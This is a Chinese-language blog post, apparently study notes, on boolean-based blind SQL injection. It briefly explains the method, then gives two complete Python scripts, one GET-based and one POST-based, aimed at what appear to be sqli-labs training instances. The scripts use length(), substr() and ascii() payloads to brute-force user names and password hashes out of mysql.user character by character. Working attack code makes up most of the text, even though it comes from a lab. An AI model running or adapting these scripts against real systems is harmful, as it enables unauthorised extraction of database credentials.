# 布尔盲注


&gt;参考博客：https://blog.csdn.net/wangyuxiang946/article/details/123486880?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168717513616800182146667%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168717513616800182146667&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123486880-null-null.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4187
## 1.适用情况
页面**只有**登录成功和登录失败这**两种情况**时，可以使用布尔盲注。

## 2.步骤
（1）使用 length()函数 判断查询结果的长度
（2）使用 substr()函数 截取每一个字符，并穷举出字符内容

## 3.手工注入很费时用脚本
（1）get型布尔盲注
```
import requests

# 只需要修改url 和 两个payload即可
# 目标网址（不带参数）
url = &#34;http://3534c6c2bffd4225bf3409ae9a2ec278.app.mituan.zone/Less-5/&#34;
# 猜解长度使用的payload
payload_len = &#34;&#34;&#34;?id=1&#39; and length(
	                (select group_concat(user,password)
                    from mysql.user)
                ) &lt; {n} -- a&#34;&#34;&#34;
# 枚举字符使用的payload
payload_str = &#34;&#34;&#34;?id=1&#39; and ascii(
	                substr(
		                (select group_concat(user,password)
		                from mysql.user)
	                ,{n},1)
                ) = {r} -- a&#34;&#34;&#34;

# 获取长度
def getLength(url, payload):
    length = 1  # 初始测试长度为1
    while True:
        response = requests.get(url= url&#43;payload_len.format(n= length))
        # 页面中出现此内容则表示成功
        if &#39;You are in...........&#39; in response.text:
            print(&#39;测试长度完成，长度为：&#39;, length,)
            return length;
        else:
            print(&#39;正在测试长度：&#39;,length)
            length &#43;= 1  # 测试长度递增

# 获取字符
def getStr(url, payload, length):
    str = &#39;&#39;  # 初始表名/库名为空
    # 第一层循环，截取每一个字符
    for l in range(1, length&#43;1):
        # 第二层循环，枚举截取字符的每一种可能性
        for n in range(33, 126):
            response = requests.get(url= url&#43;payload_str.format(n= l, r= n))
            # 页面中出现此内容则表示成功
            if &#39;You are in...........&#39; in response.text:
                str&#43;= chr(n)
                print(&#39;第&#39;, l, &#39;个字符猜解成功：&#39;, str)
                break;
    return str;

# 开始猜解
length = getLength(url, payload_len)
getStr(url, payload_str, length)

```
（2）post型布尔盲注
```
import requests

# 网站路径
url = &#34;http://7eb82265178a435aa86d6728e7b1e08a.app.mituan.zone/Less-13/&#34;
# 判断长度的payload
payload_len = &#34;&#34;&#34;a&#39;) or length(
                    (select group_concat(user,password) 
                     from mysql.user)
                )&gt;{n} -- a&#34;&#34;&#34;
# 枚举字符的payload
payload_str = &#34;&#34;&#34;a&#39;) or ascii(
                    substr(
                        (select group_concat(user,password)
                        from mysql.user)
                    ,{l},1)
                )={n} -- a&#34;&#34;&#34;

# post请求参数
data= {
    &#34;uname&#34; : &#34;a&#39;) or 1 -- a&#34;,
    &#34;passwd&#34; : &#34;1&#34;,
    &#34;submit&#34; : &#34;Submit&#34;
}

# 判断长度
def getLen(payload_len):
    length = 1
    while True:
        # 修改请求参数
        data[&#34;uname&#34;] = payload_len.format(n = length)
        response = requests.post(url=url, data=data)
        # 出现此内容为登录成功
        if &#39;../images/flag.jpg&#39; in response.text:
            print(&#39;正在测试长度：&#39;, length)
            length &#43;= 1
        else:
            print(&#39;测试成功，长度为：&#39;, length)
            return length;

# 枚举字符
def getStr(length):
    str = &#39;&#39;
    # 从第一个字符开始截取
    for l in range(1, length&#43;1):
        # 枚举字符的每一种可能性
        for n in range(32, 126):
            data[&#34;uname&#34;] = payload_str.format(l=l, n=n)
            response = requests.post(url=url, data=data)
            if &#39;../images/flag.jpg&#39; in response.text:
                str &#43;= chr(n)
                print(&#39;第&#39;, l, &#39;个字符枚举成功：&#39;,str )
                break

length = getLen(payload_len)
getStr(length)

```


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/  

